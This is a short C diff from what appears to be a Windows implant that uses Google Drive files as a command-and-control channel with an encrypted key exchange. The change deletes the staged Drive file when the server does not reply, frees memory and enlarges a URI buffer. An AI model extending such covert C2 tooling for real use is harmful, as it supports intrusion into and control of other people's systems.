@@ -90,6 +90,7 @@ BOOL DriveStart
 	LPSTR lpPublicKeyHexDigest = NULL;
 	DWORD dwNumberOfTries = 0;
 	PDRIVE_PROFILE pProfile = NULL;
+	LPSTR lpFileId = NULL;
 
 	pMarshaledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
 	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshaledData->pMarshaledData, pMarshaledData->cbMarshaledData, &cbEncryptedSessionInit);
@@ -144,6 +145,11 @@ BOOL DriveStart
 	}
 
 	if (pRespData == NULL) {
+		lpFileId = GetFileId(pDriveClient, &szName, 1);
+		if (lpFileId != NULL) {
+			DriveDelete(pDriveClient, lpFileId);
+		}
+
 		goto CLEANUP;
 	}
 
@@ -151,6 +157,7 @@ BOOL DriveStart
 	memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
 	Result = TRUE;
 CLEANUP:
+	FREE(lpFileId);
 	FreeHttpResp(pResp);
 	FreeHttpClient(pHttpClient);
 	FREE(lpUniqueBoundary);
@@ -462,7 +469,7 @@ PBUFFER DriveDownload
 		goto CLEANUP;
 	}
 
-	lpTempUri = DuplicateStrA(szUri, 0x40);
+	lpTempUri = DuplicateStrA(szUri, 0x80);
 	wsprintfA(&lpTempUri[lstrlenA(lpTempUri)], "%s?alt=media", lpFileId);
 	pUri = UriInit(lpTempUri);
 	if (pUri == NULL) {
